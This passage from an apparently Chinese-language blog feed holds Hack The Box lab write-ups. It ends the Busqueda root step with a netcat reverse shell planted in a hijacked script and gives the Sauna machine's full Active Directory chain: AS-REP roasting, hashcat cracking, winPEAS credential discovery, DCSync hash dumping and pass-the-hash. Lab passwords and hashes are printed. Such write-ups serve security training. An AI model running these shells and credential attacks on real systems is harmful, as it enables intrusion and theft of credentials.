ED25519 key fingerprint is SHA256:LJb8mGFiqKYQw3uev+b/ScrLuI4Fw7jxHJAoaLVPJLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="token number">10.10</span>.11.208<span class="token string">' (ED25519) to the list of known hosts.
svc@10.10.11.208'</span>s password: 
Welcome to Ubuntu <span class="token number">22.04</span>.2 LTS <span class="token punctuation">(</span>GNU/Linux <span class="token number">5.15</span>.0-69-generic x86_64<span class="token punctuation">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
The list of available updates is <span class="token function">more</span> than a week old.
To check <span class="token keyword">for</span> new updates run: <span class="token function">sudo</span> <span class="token function">apt</span> update

Last login: Tue Apr  <span class="token number">4</span> <span class="token number">17</span>:02:09 <span class="token number">2023</span> from <span class="token number">10.10</span>.14.19
svc@busqueda:~$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> svc: 
Matching Defaults entries <span class="token keyword">for</span> svc on busqueda:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> /usr/bin/python3 /opt/scripts/system-checkup.py *</code></pre>

<p>尝试运行脚本，支持三个命令</p>
<pre class="language-none"><code class="language-none">svc@busqueda:&#x2F;opt&#x2F;scripts$ sudo &#x2F;usr&#x2F;bin&#x2F;python3  &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py *
Usage: &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py &lt;action&gt; (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup</code></pre>

<p>使用 docker-inspect 查找环境配置，可以找到一条密码</p>
<pre class="language-none"><code class="language-none">svc@busqueda:~$ sudo &#x2F;usr&#x2F;bin&#x2F;python3  &#x2F;opt&#x2F;scripts&#x2F;system-checkup.py docker-inspect &#39;&#123;&#123;json .&#125;&#125;&#39; gitea | jq

&lt;...&gt;
&quot;Env&quot;: [
      &quot;USER_UID&#x3D;115&quot;,
      &quot;USER_GID&#x3D;121&quot;,
      &quot;GITEA__database__DB_TYPE&#x3D;mysql&quot;,
      &quot;GITEA__database__HOST&#x3D;db:3306&quot;,
      &quot;GITEA__database__NAME&#x3D;gitea&quot;,
      &quot;GITEA__database__USER&#x3D;gitea&quot;,
      &quot;GITEA__database__PASSWD&#x3D;yuiu1hoiu4i5ho1uh&quot;,
      &quot;PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;,
      &quot;USER&#x3D;git&quot;,
      &quot;GITEA_CUSTOM&#x3D;&#x2F;data&#x2F;gitea&quot;
    ],
    &quot;Cmd&quot;: [
      &quot;&#x2F;bin&#x2F;s6-svscan&quot;,
      &quot;&#x2F;etc&#x2F;s6&quot;
    ],
    &quot;Image&quot;: &quot;gitea&#x2F;gitea:latest&quot;,
&lt;...&gt;</code></pre>

<p>先使用cody 登录gitea 可以找到另一个用户是administrator，使用找到的密码登录gitea  administrator：yuiu1hoiu4i5ho1uh</p>
<img src="/Hackthebox/htb/htb-busqueda/image-20250323132554909.png" class="" title="code review">

<p>分析代码·<code> arg_list = [&#39;./full-checkup.sh&#39;]</code>  使用的是相对路径</p>
<pre class="language-Python" data-language="Python"><code class="language-Python">#!&#x2F;bin&#x2F;bash
import subprocess
import sys

actions &#x3D; [&#39;full-checkup&#39;, &#39;docker-ps&#39;,&#39;docker-inspect&#39;]

def run_command(arg_list):
    r &#x3D; subprocess.run(arg_list, capture_output&#x3D;True)
    if r.stderr:
        output &#x3D; r.stderr.decode()
    else:
        output &#x3D; r.stdout.decode()

    return output


def process_action(action):
    if action &#x3D;&#x3D; &#39;docker-inspect&#39;:
        try:
            _format &#x3D; sys.argv[2]
            if len(_format) &#x3D;&#x3D; 0:
                print(f&quot;Format can&#39;t be empty&quot;)
                exit(1)
            container &#x3D; sys.argv[3]
            arg_list &#x3D; [&#39;docker&#39;, &#39;inspect&#39;, &#39;--format&#39;, _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f&quot;Usage: &#123;sys.argv[0]&#125; docker-inspect &lt;format&gt; &lt;container_name&gt;&quot;)
            exit(1)
    
        except Exception as e:
            print(&#39;Something went wrong&#39;)
            exit(1)
    
    elif action &#x3D;&#x3D; &#39;docker-ps&#39;:
        try:
            arg_list &#x3D; [&#39;docker&#39;, &#39;ps&#39;]
            print(run_command(arg_list)) 
        
        except:
            print(&#39;Something went wrong&#39;)
            exit(1)

    elif action &#x3D;&#x3D; &#39;full-checkup&#39;:
        try:
            arg_list &#x3D; [&#39;.&#x2F;full-checkup.sh&#39;]
            print(run_command(arg_list))
            print(&#39;[+] Done!&#39;)
        except:
            print(&#39;Something went wrong&#39;)
            exit(1)
            

if __name__ &#x3D;&#x3D; &#39;__main__&#39;:

    try:
        action &#x3D; sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f&#39;Usage: &#123;sys.argv[0]&#125; &lt;action&gt; (arg1) (arg2)&#39;)
        print(&#39;&#39;)
        print(&#39;     docker-ps     : List running docker containers&#39;)
        print(&#39;     docker-inspect : Inpect a certain docker container&#39;)
        print(&#39;     full-checkup  : Run a full system checkup&#39;)
        print(&#39;&#39;)
        exit(1)</code></pre>

<p>使用nano 在&#x2F;tmp 创建full-checkup.sh </p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
<span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">10.10</span>.16.39 <span class="token number">9009</span> <span class="token operator">></span>/tmp/f</code></pre>

<p>添加执行权限，然后执行命令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">svc@busqueda:/tmp$ <span class="token function">chmod</span> +x full-checkup.sh 
svc@busqueda:/tmp$ <span class="token function">sudo</span> /usr/bin/python3  /opt/scripts/system-checkup.py full-checkup</code></pre>

<p>Getshell</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> <span class="token parameter variable">-lnvp</span> <span class="token number">9009</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">9009</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">10.10</span>.16.39<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">10.10</span>.11.208<span class="token punctuation">]</span> <span class="token number">36396</span>
<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span>
<span class="token comment"># cat /root/root.txt</span>
</code></pre>

<table>
<thead>
<tr>
<th>Flag</th>
<th>Path</th>
</tr>
</thead>
<tbody><tr>
<td>Flag1</td>
<td>&#x2F;home&#x2F;svc&#x2F;user.txt</td>
</tr>
<tr>
<td>Flag2</td>
<td>&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>密码重用</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Sauna</title>
    <url>/Hackthebox/htb/htb-sauna/</url>
    <content><![CDATA[<style>.zmigovrhuhfs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-sauna/f31d5d0264fadc267e7f38a9d7729d14.png" class="zmigovrhuhfs">

<span id="more"></span>

<table>
<thead>
<tr>
<th>OS</th>
<th>Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td>Windows</td>
<td>Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span>  
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-03-22 <span class="token number">15</span>:19 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.175
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.11s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65515</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
<span class="token number">53</span>/tcp    <span class="token function">open</span>  domain        Simple DNS Plus
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http          Microsoft IIS httpd <span class="token number">10.0</span>
<span class="token operator">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="token operator">|</span>_http-title: Egotistical Bank :: Home
<span class="token operator">|</span> http-methods: 
<span class="token operator">|</span>_  Potentially risky methods: TRACE
<span class="token number">88</span>/tcp    <span class="token function">open</span>  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: <span class="token number">2025</span>-03-22 <span class="token number">14</span>:03:56Z<span class="token punctuation">)</span>
<span class="token number">135</span>/tcp   <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">139</span>/tcp   <span class="token function">open</span>  netbios-ssn   Microsoft Windows netbios-ssn
<span class="token number">389</span>/tcp   <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">445</span>/tcp   <span class="token function">open</span>  microsoft-ds?
<span class="token number">464</span>/tcp   <span class="token function">open</span>  kpasswd5?
<span class="token number">593</span>/tcp   <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">636</span>/tcp   <span class="token function">open</span>  tcpwrapped
<span class="token number">3268</span>/tcp  <span class="token function">open</span>  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name<span class="token punctuation">)</span>
<span class="token number">3269</span>/tcp  <span class="token function">open</span>  tcpwrapped
<span class="token number">5985</span>/tcp  <span class="token function">open</span>  http          Microsoft HTTPAPI httpd <span class="token number">2.0</span> <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token operator">|</span>_http-title: Not Found
<span class="token operator">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="token number">9389</span>/tcp  <span class="token function">open</span>  mc-nmf        .NET Message Framing
<span class="token number">49667</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49673</span>/tcp <span class="token function">open</span>  ncacn_http    Microsoft Windows RPC over HTTP <span class="token number">1.0</span>
<span class="token number">49674</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49677</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49695</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
<span class="token number">49717</span>/tcp <span class="token function">open</span>  msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="token operator">|</span> smb2-time: 
<span class="token operator">|</span>   date: <span class="token number">2025</span>-03-22T14:04:50
<span class="token operator">|</span>_  start_date: N/A
<span class="token operator">|</span>_clock-skew: 6h41m33s
<span class="token operator">|</span> smb2-security-mode: 
<span class="token operator">|</span>   <span class="token number">3</span>:1:1: 
<span class="token operator">|</span>_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">278.88</span> seconds
</code></pre>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>访问80端口发现一个网站，在&#x2F;about 上可以看到一些用户名</p>
<img src="/Hackthebox/htb/htb-sauna/image-20250322153810191.png" class="" title="用户名收集">



<p>收集页面上的用户名</p>
<pre class="language-none"><code class="language-none">Fergus Smith
Shaun Coins
Hugo Bear
Bowie Taylor
Sophie Driver
Steven Kerb</code></pre>

<p>根据用户名重新生成用户名组合</p>
<pre class="language-none"><code class="language-none">$ .&#x2F;username-anarchy --input-file user.txt --select-format first,flast,first.last firstl &gt; username.txt    </code></pre>

<pre class="language-none"><code class="language-none">firstl
fergus
fergus.smith
fsmith
shaun
shaun.coins
scoins
hugo
hugo.bear
hbear
bowie
bowie.taylor
btaylor
sophie
sophie.driver
sdriver
steven
steven.kerb
skerb</code></pre>

<h3 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h3><p>使用 impacket-GetNPUsers </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-usersfile</span> username.txt -no-pass 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477d158ddd194616ff3f5568be1a<span class="token variable">$30b7b9edf20400313d31252b04ee37223a106f79c2d7432fe6f0bf421560f31c7fc566ae368e479428ae09f12a5f86926427ac033248ff05f0ef514574ebd4721f533c79add45bd1b010903e58fb3aeca94f58333811b69ef70346ad227828e5fa36a7d54f4534c51830e7746b5ae87c75dc5c9c4813161eda621fec33235f4872488395fb674c0a154d4fe83892cb301bbaefcef1c3c4ff287e2a4f7903807d08694adcf89d7eb820afaf3ab45440ff68b1bb99385cc8ded853bce4908e7b1e1d669d9f82aca5020be559f060559e78828f3f33c48a4051aef7b8316caa375498b544290d032baf45db2d62e0779ee44f9fb0589ec46f44418ecc0399b16703</span>
<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN<span class="token punctuation">(</span>Client not found <span class="token keyword">in</span> Kerberos database<span class="token punctuation">)</span>
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>使用hashcat 破解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ hashcat <span class="token parameter variable">-a</span> <span class="token number">0</span> <span class="token parameter variable">-m</span> <span class="token number">18200</span> <span class="token builtin class-name">hash</span> /usr/share/wordlists/rockyou.txt
hashcat <span class="token punctuation">(</span>v6.2.6<span class="token punctuation">)</span> starting

<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
Watchdog: Temperature abort trigger <span class="token builtin class-name">set</span> to 90c

Host memory required <span class="token keyword">for</span> this attack: <span class="token number">52</span> MB

Dictionary cache hit:
* Filename<span class="token punctuation">..</span>: /usr/share/wordlists/rockyou.txt
* Passwords.: <span class="token number">14344385</span>
* Bytes<span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">139921507</span>
* Keyspace<span class="token punctuation">..</span>: <span class="token number">14344385</span>

<span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477d158ddd194616ff3f5568be1a<span class="token variable">$30b7b9edf20400313d31252b04ee37223a106f79c2d7432fe6f0bf421560f31c7fc566ae368e479428ae09f12a5f86926427ac033248ff05f0ef514574ebd4721f533c79add45bd1b010903e58fb3aeca94f58333811b69ef70346ad227828e5fa36a7d54f4534c51830e7746b5ae87c75dc5c9c4813161eda621fec33235f4872488395fb674c0a154d4fe83892cb301bbaefcef1c3c4ff287e2a4f7903807d08694adcf89d7eb820afaf3ab45440ff68b1bb99385cc8ded853bce4908e7b1e1d669d9f82aca5020be559f060559e78828f3f33c48a4051aef7b8316caa375498b544290d032baf45db2d62e0779ee44f9fb0589ec46f44418ecc0399b16703</span>:Thestrokes23
                                                          
Session<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: hashcat
Status<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: Cracked
Hash.Mode<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">18200</span> <span class="token punctuation">(</span>Kerberos <span class="token number">5</span>, etype <span class="token number">23</span>, AS-REP<span class="token punctuation">)</span>
Hash.Target<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token variable">$krb5asrep</span><span class="token variable">$23</span><span class="token variable">$fsmith</span>@EGOTISTICAL-BANK.LOCAL:139d477<span class="token punctuation">..</span>.b16703
Time.Started<span class="token punctuation">..</span><span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:56 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">2</span> secs<span class="token punctuation">)</span>
Time.Estimated<span class="token punctuation">..</span>.: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:58 <span class="token number">2025</span> <span class="token punctuation">(</span><span class="token number">0</span> secs<span class="token punctuation">)</span>
Kernel.Feature<span class="token punctuation">..</span>.: Pure Kernel
Guess.Base<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: File <span class="token punctuation">(</span>/usr/share/wordlists/rockyou.txt<span class="token punctuation">)</span>
Guess.Queue<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
Speed.<span class="token comment">#1.........:  7849.5 kH/s (9.73ms) @ Accel:1024 Loops:1 Thr:32 Vec:1</span>
Recovered<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>total<span class="token punctuation">)</span>, <span class="token number">1</span>/1 <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span> Digests <span class="token punctuation">(</span>new<span class="token punctuation">)</span>
Progress<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">10616832</span>/14344385 <span class="token punctuation">(</span><span class="token number">74.01</span>%<span class="token punctuation">)</span>
Rejected<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.: <span class="token number">0</span>/10616832 <span class="token punctuation">(</span><span class="token number">0.00</span>%<span class="token punctuation">)</span>
Restore.Point<span class="token punctuation">..</span><span class="token punctuation">..</span>: <span class="token number">10420224</span>/14344385 <span class="token punctuation">(</span><span class="token number">72.64</span>%<span class="token punctuation">)</span>
Restore.Sub.<span class="token comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span>
Candidate.Engine.: Device Generator
Candidates.<span class="token comment">#1....: aaron822 -> Saboka54</span>
Hardware.Mon.<span class="token comment">#1..: Temp: 44c Util: 50% Core:1771MHz Mem:3504MHz Bus:8</span>

Started: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:43 <span class="token number">2025</span>
Stopped: Sat Mar <span class="token number">22</span> <span class="token number">16</span>:45:59 <span class="token number">2025</span>
</code></pre>

<p>使用evil-winrm 登录目标</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ evil-winrm <span class="token parameter variable">-i</span> <span class="token number">10.10</span>.10.175 <span class="token parameter variable">-u</span> fsmith  <span class="token parameter variable">-p</span> Thestrokes23 
                                        
Evil-WinRM shell v3.7
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>                                       
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>Documents<span class="token operator">></span> 
*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>desktop<span class="token operator">></span> <span class="token function">dir</span>
    Directory: C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        <span class="token number">3</span>/22/2025   <span class="token number">6</span>:49 AM             <span class="token number">34</span> user.txt
</code></pre>

<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>上传winPEASany.exe并运行。可以找到凭证</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>FSmith<span class="token punctuation">\</span>Documents<span class="token operator">></span> .<span class="token punctuation">\</span>winPEASany.exe
ANSI color bit <span class="token keyword">for</span> Windows is not set. If you are executing this from a Windows terminal inside the <span class="token function">host</span> you should run <span class="token string">'REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="token keyword">then</span> start a new CMD
Long paths are disabled, so the maximum length of a path supported is <span class="token number">260</span> chars <span class="token punctuation">(</span>this may cause <span class="token boolean">false</span> negatives when looking <span class="token keyword">for</span> files<span class="token punctuation">)</span>. If you are admin, you can <span class="token builtin class-name">enable</span> it with <span class="token string">'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1'</span> and <span class="token keyword">then</span> start a new CMD
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span>
ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking <span class="token keyword">for</span> AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             <span class="token builtin class-name">:</span>  EGOTISTICALBANK
    DefaultUserName               <span class="token builtin class-name">:</span>  EGOTISTICALBANK<span class="token punctuation">\</span>svc_loanmanager
    DefaultPassword               <span class="token builtin class-name">:</span>  Moneymakestheworldgoround<span class="token operator">!</span>

ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
<span class="token operator">&lt;</span><span class="token punctuation">..</span>.<span class="token operator">></span></code></pre>

<p>使用Bloodhound分析域信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ bloodhound-python   <span class="token parameter variable">-u</span> fsmith  <span class="token parameter variable">-p</span> Thestrokes23  <span class="token parameter variable">-d</span> EGOTISTICAL-BANK.LOCAL <span class="token parameter variable">-ns</span> <span class="token number">10.10</span>.10.175  <span class="token parameter variable">-c</span> all <span class="token parameter variable">--zip</span>
INFO: BloodHound.py <span class="token keyword">for</span> BloodHound LEGACY <span class="token punctuation">(</span>BloodHound <span class="token number">4.2</span> and <span class="token number">4.3</span><span class="token punctuation">)</span>
INFO: Found AD domain: egotistical-bank.local
INFO: Getting TGT <span class="token keyword">for</span> user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: <span class="token punctuation">[</span>Errno Connection error <span class="token punctuation">(</span>SAUNA.EGOTISTICAL-BANK.LOCAL:88<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token punctuation">[</span>Errno -2<span class="token punctuation">]</span> Name or <span class="token function">service</span> not known
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found <span class="token number">1</span> domains
INFO: Found <span class="token number">1</span> domains <span class="token keyword">in</span> the forest
INFO: Found <span class="token number">1</span> computers
INFO: Connecting to LDAP server: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Found <span class="token number">7</span> <span class="token function">users</span>
INFO: Found <span class="token number">52</span> <span class="token function">groups</span>
INFO: Found <span class="token number">3</span> gpos
INFO: Found <span class="token number">1</span> ous
INFO: Found <span class="token number">19</span> containers
INFO: Found <span class="token number">0</span> trusts
INFO: Starting computer enumeration with <span class="token number">10</span> workers
INFO: Querying computer: SAUNA.EGOTISTICAL-BANK.LOCAL
INFO: Done <span class="token keyword">in</span> 00M 36S
INFO: Compressing output into 20250322171023_bloodhound.zip
</code></pre>

<img src="/Hackthebox/htb/htb-sauna/image-20250322171839977.png" class="" title="Bloodhound">

<h3 id="DCsync-attack"><a href="#DCsync-attack" class="headerlink" title="DCsync attack"></a>DCsync attack</h3><p>使用impacket-secretsdump 进行DCSync attack </p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-secretsdump  <span class="token string">'EGOTISTICAL-BANK/svc_loanmgr@10.10.10.175'</span>  -just-dc-user Administrator 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Dumping Domain Credentials <span class="token punctuation">(</span>domain<span class="token punctuation">\</span>uid:rid:lmhash:nthash<span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
Administrator:des-cbc-md5:fb8f321c64cea87f
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cleaning up<span class="token punctuation">..</span>. 
</code></pre>

<p>使用impacket-psexec 登录目标，获得系统权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ impacket-psexec <span class="token string">'EGOTISTICAL-BANK/Administrator@10.10.10.175'</span> <span class="token parameter variable">-hashes</span> <span class="token string">'aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e'</span> 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Requesting shares on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Found writable share ADMIN$
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading <span class="token function">file</span> eVKpxetW.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Opening SVCManager on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating <span class="token function">service</span> dRDK on <span class="token number">10.10</span>.10.175<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting <span class="token function">service</span> dRDK<span class="token punctuation">..</span><span class="token punctuation">..</span>.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Press <span class="token builtin class-name">help</span> <span class="token keyword">for</span> extra shell commands
Microsoft Windows <span class="token punctuation">[</span>Version <span class="token number">10.0</span>.17763.973<span class="token punctuation">]</span>
<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2018</span> Microsoft Corporation. All rights reserved.

C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>system3<span class="token operator"><span class="token file-descriptor important">2</span>></span> <span class="token function">whoami</span>
nt authority<span class="token punctuation">\</span>system
</code></pre>

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
